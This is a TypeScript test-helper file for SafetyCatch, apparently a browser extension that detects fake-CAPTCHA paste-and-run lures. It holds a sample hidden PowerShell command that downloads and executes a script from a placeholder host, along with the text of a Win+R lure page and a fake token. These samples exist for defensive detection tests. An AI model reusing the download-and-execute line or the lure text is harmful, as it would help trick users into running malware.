// Copyright 2026 The SafetyCatch Authors
// SPDX-License-Identifier: Apache-2.0
//
// Test helpers.
//
// Attack-like samples are written with "¦" (U+00A6) inside sensitive words and
// "armed" at run time, so no file in this repository contains a realistic
// attack string that antivirus software would quarantine (CONVENTIONS.md 6).
// All domains are defanged (.example, .test, example.com).

import * as engine from 'safetycatch-engine';
import { createCore, type Core, type CoreDeps, type Engine, type KeyValue } from '../src/background/core.ts';
import { LOCALE_FOLDERS, UI_LOCALES, type UiLocale } from '../src/shared/i18n.ts';
import type { ShowPush } from '../src/shared/protocol.ts';
import { messagesJson } from '../scripts/locales.ts';

/** Remove the "¦" fragment markers. */
export const arm = (s: string): string => s.replace(/¦/g, '');

/** A classic fake-CAPTCHA paste-and-run line (defanged host, armed at run time). */
export const clickFixSample = (): string => arm('pow¦ershell -w hid¦den -nop -c "i¦wr https://cdn.example.test/v | i¦ex" # I am not a robot - reCAPTCHA Verification ID: 5521');

/** A harmless line that still reads like a fake-verification command (it only prints text). */
export const harmlessLure = (): string => arm('pow¦ershell -w hid¦den -c "Write-Output \'SafetyCatch test\'" # I am not a robot - reCAPTCHA Verification ID: 4821');

/** A made-up token shaped like a GitHub token. Never a real key. */
export const fakeToken = (): string => arm('gh¦p_¦A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8');

export const LURE_PAGE_TEXT = 'Verify you are human. To prove you are not a robot: 1. Press Windows + R  2. Press Ctrl + V  3. Press Enter';

export const realEngine: Engine = {
  analyzeCommand: engine.analyzeCommand,
  analyzePageText: engine.analyzePageText,
  analyzeUrl: engine.analyzeUrl,
  analyzeAuthFlow: engine.analyzeAuthFlow,
  scanSecrets: engine.scanSecrets,
  analyzeDownload: engine.analyzeDownload,
  localize: engine.localize,
  levelLabel: engine.levelLabel,
  translate: engine.translate,
  registrableDomain: engine.registrableDomain,
  ENGINE_VERSION: engine.ENGINE_VERSION,
};

export function memoryStore(initial: Record<string, unknown> = {}): KeyValue & { data: Record<string, unknown>; failing: boolean } {
  const store = {
    data: { ...initial } as Record<string, unknown>,
    failing: false,
    get: async (key: string): Promise<unknown> => {
      if (store.failing) throw new Error('storage unavailable');
      return structuredClone(store.data[key]);
    },
    set: async (key: string, value: unknown): Promise<void> => {
      if (store.failing) throw new Error('storage unavailable');
      store.data[key] = structuredClone(value);
    },
  };
  return store;
}

const folderLocale = (folder: string): UiLocale => UI_LOCALES.find((l) => LOCALE_FOLDERS[l].includes(folder)) ?? 'en';

export interface Harness {
  core: Core;
  local: ReturnType<typeof memoryStore>;
  session: ReturnType<typeof memoryStore>;
  /** Warnings handed to the top frame. */
  shown: ShowPush[];
  /** Tabs sent away from a page. */
  left: number[];
  /** Jobs the core asked to run later. */
  deferred: Array<() => void>;
  advance(ms: number): void;
  language: string;
}

/** A service-worker core wired to the real engine, in-memory storage and the real message catalogs. */
export function harness(overrides: Partial<CoreDeps> = {}, local: Record<string, unknown> = {}): Harness {
  let now = 1_800_000_000_000;
  const h: Harness = {
    core: undefined as unknown as Core,
    local: memoryStore(local),
    session: memoryStore(),
    shown: [],
    left: [],
    deferred: [],
    advance: (ms) => {
      now += ms;
    },
    language: 'en-US',
  };
  h.core = createCore({
    engine: realEngine,
    local: h.local,
    session: h.session,
    now: () => now,
    uiLanguage: () => h.language,
    loadMessages: async (folder) => messagesJson(folderLocale(folder)),
    showInTop: async (_tabId, push) => {
      h.shown.push(push);
      return true;
    },
    leaveTab: async (tabId) => {
      h.left.push(tabId);
      return true;
    },
    sleep: async () => undefined,
    defer: (job) => {
      h.deferred.push(job);
    },
    version: '0.1.0',
    ...overrides,
  });
  return h;
}

/** A top-frame sender on the given page. */
export const from = (tabUrl: string, tabId = 1, frameId = 0): { tabId: number; frameId: number; tabUrl: string } => ({ tabId, frameId, tabUrl });
